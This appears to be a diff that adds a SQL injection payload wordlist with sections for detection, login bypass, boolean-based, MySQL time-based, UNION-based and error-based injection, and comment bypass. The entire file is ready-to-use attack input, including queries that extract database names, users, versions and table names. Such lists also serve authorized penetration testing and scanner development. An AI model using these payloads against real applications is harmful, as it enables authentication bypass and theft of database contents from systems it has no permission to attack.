@@ -1,0 +1,61 @@
+# =========================
+# BASIC DETECTION
+# =========================
+'
+"
+`
+')
+")
+
+# =========================
+# AUTH BYPASS
+# =========================
+' OR '1'='1
+' OR '1'='1' --
+' OR 1=1 --
+admin' --
+' OR ''='
+' OR 'a'='a
+
+# =========================
+# BOOLEAN BASED
+# =========================
+' OR '1'='1
+' OR '1'='2
+1 AND 1=1
+1 AND 1=2
+' AND '1'='1
+' AND '1'='2
+
+# =========================
+# TIME BASED (MySQL)
+# =========================
+' OR SLEEP(5)-- 
+' AND SLEEP(5)-- 
+1 OR SLEEP(5)
+1 AND SLEEP(5)
+' OR IF(1=1,SLEEP(5),0)-- 
+' AND IF(1=2,SLEEP(5),0)-- 
+
+# =========================
+# UNION BASED
+# =========================
+' UNION SELECT NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(),user()--
+' UNION SELECT @@version,NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+# =========================
+# ERROR BASED (MySQL)
+# =========================
+' AND extractvalue(1,concat(0x7e,database()))--
+' AND updatexml(1,concat(0x7e,user()),1)--
+' AND extractvalue(1,concat(0x7e,version()))--
+
+# =========================
+# COMMENT BYPASS
+# =========================
+' OR 1=1#
+' OR 1=1/*
+' OR 1=1-- -
